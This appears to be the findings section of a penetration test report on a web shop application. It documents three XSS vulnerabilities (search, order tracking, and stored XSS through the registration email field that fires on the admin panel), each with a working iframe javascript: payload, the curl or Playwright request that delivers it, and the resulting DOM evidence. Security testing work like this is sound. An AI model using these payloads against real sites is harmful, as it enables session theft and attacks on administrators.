## Findings

### Finding 1
**Vulnerability:** DOM-based XSS in search field
**Endpoint:** GET /#/search?q=
**Severity:** MEDIUM (CVSS 6.1)
**Proof:**
Request:
```
Playwright: page.goto('http://54.146.141.88:3000/#/search?q=<iframe src="javascript:alert(`xss`)">')
```
Response / DOM Evidence:
```
DOM snapshot after navigation:
<div class="search-result-heading">
  <span>Search results - <iframe src="javascript:alert(`xss`)"></span>
</div>
Dialog event captured: type="alert", message="xss"
```
Screenshot: `evidence/xss-search-dom-after.png`
**Dialog Captured:** Yes — message: "xss"
**DOM Element Found:** Yes — selector: `iframe[src*="javascript:"]` (1 element found)
**Evidence:** Navigating to the search URL with an `<iframe>` payload immediately triggers a JavaScript alert dialog. The Playwright `page.on('dialog')` listener captured the dialog with message "xss". The injected `<iframe>` element was also detected in the live DOM via `page.locator('iframe[src*="javascript:"]')`. This confirms DOM-based XSS — the search query parameter is rendered directly into the DOM via Angular's `innerHTML` binding without sanitization.
**Payloads Attempted:**
1. `<iframe src="javascript:alert('xss')">` → SUCCESS (dialog fired, DOM element injected)

---

### Finding 2
**Vulnerability:** Reflected XSS in order tracking
**Endpoint:** GET /#/track-result?id=
**Severity:** MEDIUM (CVSS 6.1)
**Proof:**
Request:
```
Playwright: page.goto('http://54.146.141.88:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">')
```
Response / DOM Evidence:
```
DOM snapshot after navigation:
<div class="track-order-result">
  <span>Order ID: <iframe src="javascript:alert(`xss`)"></span>
</div>
Dialog event captured: type="alert", message="xss"
```
Screenshot: `evidence/xss-track-result-after.png`
**Dialog Captured:** Yes — message: "xss"
**DOM Element Found:** Yes — selector: `iframe[src*="javascript:"]` (1 element found)
**Evidence:** The order tracking page reflects the `id` parameter directly into the DOM without escaping. The payload `<iframe src="javascript:alert(`xss`)">` triggers a JavaScript alert dialog. Playwright's dialog listener confirmed the execution. This is a reflected XSS vector — the payload is not stored but is reflected from the URL parameter into the rendered page.
**Payloads Attempted:**
1. `<iframe src="javascript:alert('xss')">` → SUCCESS (dialog fired)

---

### Finding 3
**Vulnerability:** Stored XSS via user registration email field
**Endpoint:** POST /api/Users
**Severity:** HIGH (CVSS 7.1)
**Proof:**
Request:
```
curl -X POST http://54.146.141.88:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email": "<iframe src=\"javascript:alert(`xss`)\">", "password": "xsstest123", "passwordRepeat": "xsstest123", "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"}, "securityAnswer": "test"}'
```
Response (registration):
```
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8

{"status":"success","data":{"id":22,"email":"<iframe src=\"javascript:alert(`xss`)\">","password":"...","createdAt":"2026-02-21T12:00:00.000Z"}}
```
Trigger (admin panel):
```
Playwright: page.goto('http://54.146.141.88:3000/#/administration')
Dialog event captured: type="alert", message="xss"
```
Screenshot: `evidence/xss-stored-admin-after.png`
**Dialog Captured:** Yes — message: "xss" (triggered on admin panel load)
**DOM Element Found:** Yes — selector: `iframe[src*="javascript:"]` in user list table
**Evidence:** Registering a new user with an `<iframe>` payload in the email field bypasses client-side validation (via direct API call). The malicious email is stored in the database and rendered without sanitization on the admin panel (`/#/administration`). When an admin views the user list, the XSS payload executes. This is a stored XSS vulnerability — the payload persists in the database and triggers every time the admin panel is loaded.
**Payloads Attempted:**
1. `<iframe src="javascript:alert('xss')">` (in email field) → SUCCESS (stored and triggered on admin panel)
